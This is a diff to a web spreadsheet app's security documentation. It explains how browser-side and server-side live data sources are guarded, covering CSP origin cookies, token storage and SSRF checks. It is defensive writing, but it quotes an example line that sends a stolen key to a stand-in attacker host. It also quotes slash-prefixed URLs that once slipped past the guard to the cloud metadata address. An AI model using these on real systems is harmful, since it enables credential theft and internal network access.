@@ -15,15 +15,76 @@ are welcome and will be credited unless you'd rather not be.
 
 Only the `main` branch. There are no released versions or maintained branches yet.
 
-## Live data sources: how they are guarded
+## Live data connected from the browser
 
 Most of the app runs entirely in the browser: the spreadsheet, the formula engine, import/export,
 charts and conditional formatting never send your data anywhere. Sheets live in that browser's
 `localStorage`.
 
-The **live data sources** feature is the exception, because it asks the *server* to fetch a URL on
-your behalf. Three things guard it, and all three matter if you put this where other people can
-reach it.
+Live data comes in two kinds, and they are guarded differently because different machines make the
+request. **A source connected from the browser** (`src/lib/dataSources/browserSource.ts`) is fetched by
+the visitor's own browser, straight from their machine to their API — including one behind their VPN
+or inside their office. This app's server takes no part: the URL, the header and the data are never
+sent to it, and an e2e flow records every request the page makes to `/api/*` and checks that none
+carries any of the three.
+
+- **The request:** `fetch` with `mode: "cors"`, `credentials: "omit"` (no cookies, so a company
+  single-sign-on cookie is never sent by accident), `cache: "no-store"`. Only `https://`, or `http://`
+  on `localhost` / `127.0.0.1`; anything else is refused before a request is made. Next-page links are
+  followed only on the source's own origin, and the header goes only to that origin.
+- **`urlGuard` is deliberately not used here.** It exists so that nobody can point *this server* at
+  *this server's* network. On this path the network is the user's own, reached with the user's own
+  permissions; an internal address is the use case, not an attack. What stands between the page and an
+  origin is the browser (CORS, mixed content, private-network rules) and the page's CSP, below.
+- **The header value** lives in `sessionStorage`, keyed by the source's id (`browserSecrets.ts`), and
+  nowhere else — not `localStorage` with the source's other settings, not the workbook, not an exported
+  .xlsx/.csv/.pdf, not a crash report, not the usage counter, not any request to `/api/*`. Closing the
+  tab forgets it and the app asks again. A token that outlives the tab is one a shared computer hands to
+  the next person. A query parameter that looks like a credential (`token=`, `key=`, `apikey=`,
+  `access_token=`, …) is flagged in the form so it can be moved into the header.
+- **Redirects are the browser's.** It drops `Authorization` on a cross-origin redirect but keeps other
+  custom header names, and the API decides where it redirects. A page cannot follow redirects by hand
+  the way the server does, because it is not allowed to read where a cross-origin redirect points.
+
+### The CSP opens one user's origins to that user only
+
+`connect-src` is narrow on purpose: it is what stops an injected script from sending the visitor's own
+Anthropic key (in `sessionStorage`, see below) somewhere else. Opening it for everyone so that this
+feature works would throw that away. Instead:
+
+- When a user saves a browser source, **only the origin** of its URL (scheme, host and port — no path,
+  no query) is written to a first-party cookie, `etg-api-origins` (`Path=/`, `SameSite=Strict`,
+  `Secure`, one year).
+- `src/proxy.ts` reads the cookie on each request and appends to *that user's* `connect-src` **only the
+  entries that pass validation** (`src/lib/apiOrigins.ts`): exactly `https://host[:port]`, or
+  `http://localhost[:port]` / `http://127.0.0.1[:port]`, parsed with `new URL()` and re-derived from
+  `.origin`, so the string that reaches the header is one `URL` produced rather than one the cookie did.
+  No wildcard, no `*`, no `https:` scheme source, no credentials, no spaces, `;`, `'` or `,`; at most
+  20; anything else is dropped silently.
+- The fallback policy in `next.config.ts` is unchanged and never reads the cookie. **Someone who never
+  adds a source gets exactly the policy they always had, character for character** — checked by
+  `apiOrigins.test.ts` and by an e2e flow that reads the real header before and after a source is added.
+- A new origin takes one page reload to apply, since a page's policy is fixed when it loads. The app
+  does the reload for the user, and only if the last autosave succeeded. Deleting the last source for an
+  origin removes that origin from the cookie.
+
+**The trade-off, stated plainly:** a user who adds an API lets this page talk to that origin. If a
+script were ever injected into the page, it could write an origin of its own into the cookie too, and
+that would take effect after a reload. This design keeps the strict policy for everyone who does not
+use the feature; it does not fix XSS. Neither does CSP in general — it cannot stop a top-level
+navigation (`location = "https://evil.example/?k=" + key`) either, which is why a strict `script-src`
+(nonce plus `'strict-dynamic'`, `src/proxy.ts`) is the part that makes injection itself hard.
+
+**Not yet verified:** the private-network point in the app's checklist for IT (Chrome/Edge may want
+`Access-Control-Allow-Private-Network: true`, or the user allowing local network access) has not been
+tested against a real internal address.
+
+## Server-side live data sources: how they are guarded
+
+The **server-side sources** are the other kind: they ask *this app's server* to fetch a URL, or open a
+database, on someone's behalf. They exist only on a deployment that sets `SOURCES_ADMIN_TOKEN` — without
+it the UI does not show them at all. Three things guard them, and all three matter if you put this where
+other people can reach it.
 
 ### 1. The API is off unless you switch it on
 
@@ -37,19 +98,14 @@ One shared operator token rather than accounts, because that matches the documen
 feature: one technical person sets the sources up, everyone else just sees the data. The browser
 keeps it in `sessionStorage`, so closing the browser asks again.
 
-**A public demo (`NEXT_PUBLIC_DEMO_MODE=1`) is the one exception, and it is a narrow one.** It
-answers `GET /api/sources` with three sources hard-coded in `src/lib/server/demoSources.ts`, and
-`GET /api/sources/[id]/data` for those three ids only — no token, because there is nothing to
-protect: their URLs are app-relative paths into this app's own `/api/demo/*` handlers and are
-fixed in the source tree. Every write stays refused: create, edit, delete and test all return 403
-on a demo, which is what keeps the list closed. The visitor chooses an id, never a destination, so
-the server's HTTP client has exactly three places it can go and no way to be pointed at a fourth.
-
-Before this, a demo refused the feature outright. That was the safe thing to do while it was the
-only safe thing — but it also meant the landing page advertised something nobody could try, and a
-feature nobody can see may as well not exist. `src/lib/server/demoSources.test.ts` pins the
-invariants the argument above rests on: app-relative URLs, no credential, GET only, and an id
-lookup that matches the whole string rather than a `demo-` prefix.
+There is no exception any more. A deployment used to be able to serve three built-in sample sources
+with no token; that is gone (#109), and the server no longer seeds `data/sources.json` either.
+`NEXT_PUBLIC_DEMO_MODE=1` is still read, for deployments that set it, and now means exactly one
+thing: every server-side source route refuses with 403 `server_sources_off`, **even with a token
+set** — kept rather than removed so an old setting cannot silently switch a server feature *on*. The
+sample feeds under `/api/sample/*` still exist for screenshots and tests, and the list in
+`src/lib/server/demoSources.ts` (app-relative URLs, no credential, GET only, exact-id lookup — pinned
+by `demoSources.test.ts`) is kept for a future follow-along sample.
 
 A wrong token is compared in constant time, and "switched off" and "wrong token" are reported
 differently so an operator can tell which they are looking at.
@@ -73,8 +129,8 @@ length the address does not state. So is Teredo, `2001::/32` (RFC 4380), which c
 obscured and is switched off almost everywhere. Only `http` and `https` are allowed.
 
 A URL beginning with a single `/` is one of the app's own routes and is the one case the guard is
-skipped for — a demo source reaches `/api/demo/sales` even when the deployment's own origin is
-loopback. "Its own route" is decided by resolving the URL and comparing the *resolved origin* to the
+skipped for — an app-relative source such as the sample feed `/api/sample/sales` is reached even when the
+deployment's own origin is loopback. "Its own route" is decided by resolving the URL and comparing the *resolved origin* to the
 deployment's, not by the leading slash alone: `//169.254.169.254/` and `/\169.254.169.254/` also
 begin with a slash, but resolve to a foreign host, so they clear the full guard like any absolute
 URL. (A pentest found the earlier leading-slash shortcut let exactly these through to the metadata
@@ -146,8 +202,7 @@ port. It is sent to that origin and nowhere else:
   already fetched are kept, and the table is marked partial. A redirect to a CDN is ordinary HTTP;
   an API whose pages continue on a different host is not something to follow blind.
 
-A source reached through the app's own path (the built-in demo sources) carries no credential and
-is unaffected.
+A source reached through the app's own path (an app-relative URL such as a sample feed) is unaffected.
 
 ### 2d. One refresh has a size and a time it cannot exceed
 
@@ -157,7 +212,7 @@ not the server's memory. All five numbers live in `src/lib/dataSources/fetchLimi
 
 - **About 49 MB of body per refresh, across every page, counted after decompression.** One kilobyte
   per row at the 50,000-row ceiling the form offers; measured before choosing it, 50,000 rows are
-  8.1 MB for the demo's orders and 34.9 MB for twenty fields of mostly Thai text. The body is read as
+  8.1 MB for the sample orders feed and 34.9 MB for twenty fields of mostly Thai text. The body is read as
   a stream and the read stops the moment it passes the budget, rather than after `res.text()` has
   taken the lot; a `content-length` over the budget is refused before a byte is read. Counted after
   decompression because `fetch` inflates gzip and brotli before this code sees anything, and 53 KB
@@ -318,15 +373,21 @@ project hosts for everyone.
 admin tool. It is rate limited instead — **20 calls per minute per client address**, refused with
 `429` and a `Retry-After`. That slows a careless script or a stuck retry loop. **It does not protect
 your Anthropic bill**: the address it counts by is one a client can choose (below), so a script that
-sends a different one each time is never limited. What protects the bill is the next paragraph —
-not calling Anthropic at all on a public deployment.
+sends a different one each time is never limited. What protects the bill is the next paragraph.
 
-On a public demo the route does not reach Anthropic at all. `NEXT_PUBLIC_DEMO_MODE=1` makes it
-behave as if no key were configured — the local keyword matcher answers instead, which costs nothing
-and still returns a usable formula. This is checked by
-`src/app/api/ai/formula/route.test.ts`, which asserts the SDK is never even constructed while the
-switch is on *with a key present*, so the protection does not depend on anyone remembering to leave
-the key unset. Leaving it unset is still the better habit; two layers beat one.
+**The route uses the server's key whenever one is set** — the same on a public deployment as on your
+own machine. **If you set `ANTHROPIC_API_KEY` on a public deployment, everyone who uses the site uses
+the assistant on your key and your bill.** The only billing control is not setting it there: without a
+key the local keyword matcher answers, which costs nothing, and a visitor can bring their own key,
+which goes from their browser straight to Anthropic and never touches this route. The public site at
+excel-to-go.vercel.app is meant to run without one.
+
+`NEXT_PUBLIC_DEMO_MODE=1` used to make the route behave as if no key were configured. **It no longer
+does** (#109): the public site is not a demo, and a key someone sets should behave as it does
+self-hosted. `src/app/api/ai/formula/route.test.ts` pins both halves: with no key the SDK is never
+constructed, and the old switch does not hide a configured key. Before deploying that change, or
+removing `NEXT_PUBLIC_DEMO_MODE` from a public deployment, confirm that neither `ANTHROPIC_API_KEY` nor
+`SOURCES_ADMIN_TOKEN` is set there.
 
 The counters are held in the serving process's memory. Two instances behind a load balancer count
 separately and a serverless cold start forgets everything, so this is a guard against casual abuse,
